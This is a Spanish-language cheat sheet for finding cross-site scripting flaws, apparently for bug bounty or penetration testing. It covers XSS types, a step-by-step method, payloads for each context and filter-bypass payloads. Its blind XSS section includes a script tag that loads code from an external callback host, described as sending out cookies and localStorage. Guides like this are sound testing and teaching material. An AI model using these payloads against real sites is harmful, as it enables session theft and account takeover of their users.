# XSS — Cross-Site Scripting

## Tipos
- **Reflected**: payload en parámetro, se refleja en respuesta inmediata.
- **Stored**: payload persistido en BD, se ejecuta en otros usuarios.
- **DOM-based**: manipulación del DOM via JS del cliente.
- **Blind**: payload ejecutado en panel admin/interno no visible para ti.

## Señales de entrada
- Inputs de usuario reflejados en HTML: búsqueda, nombre, descripción, comentarios.
- Parámetros en URL que aparecen en la página.
- Notificaciones, mensajes de error con input del usuario.
- Rich text editors (WYSIWYG).
- Imports de datos (CSV, JSON) que se renderizan en tabla.
- PDFs generados con input de usuario.

## Metodología

### Paso 1: identificar reflejo
```
Input: randomstring123
¿Aparece en HTML? ¿En qué contexto?
- Dentro de tag: <div>randomstring123</div>
- En atributo: <input value="randomstring123">
- En JS: var x = "randomstring123";
- En URL: href="/path/randomstring123"
```

### Paso 2: probar según contexto
```html
<!-- Contexto HTML -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Contexto atributo -->
" onmouseover="alert(1)
javascript:alert(1)

<!-- Contexto JS -->
";alert(1);//
'-alert(1)-'

<!-- Contexto URL/href -->
javascript:alert(document.domain)
```

### Paso 3: bypass de filtros
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Sin espacios -->
<img/src=x/onerror=alert(1)>

<!-- Encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Template literals JS -->
${alert(1)}

<!-- SVG -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- Iframe srcdoc -->
<iframe srcdoc="<script>alert(1)<\/script>">

<!-- HTML entities en atributos -->
<a href="javascript&#58;alert(1)">

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

### Paso 4: Blind XSS
- Usar XSS Hunter, BXSS.me o servidor propio.
- Payload exfiltra: `document.cookie`, `document.location`, `localStorage`.
- Insertar en campos que probablemente vea un admin: nombre, razón de contacto, descripción de ticket.

```html
<script src="https://tu-xsshunter.com/payload"></script>
```

## Impacto alto
- Stored XSS en panel admin → ATO del admin.
- Robo de cookies de sesión (si no hay HttpOnly).
- Robo de tokens localStorage.
- Phishing in-app, defacement, keylogging.

## Falsos positivos
- Input escapado correctamente (ver source).
- CSP estricta que bloquea ejecución (verificar headers y probar bypass).
- Reflejo solo en contexto donde no ejecuta (texto plano).

## Evidencia mínima
- `alert(document.domain)` ejecutado en el dominio objetivo.
- O callback recibido en tu servidor con cookies/token.
- Screenshot o vídeo del popup con el dominio visible.
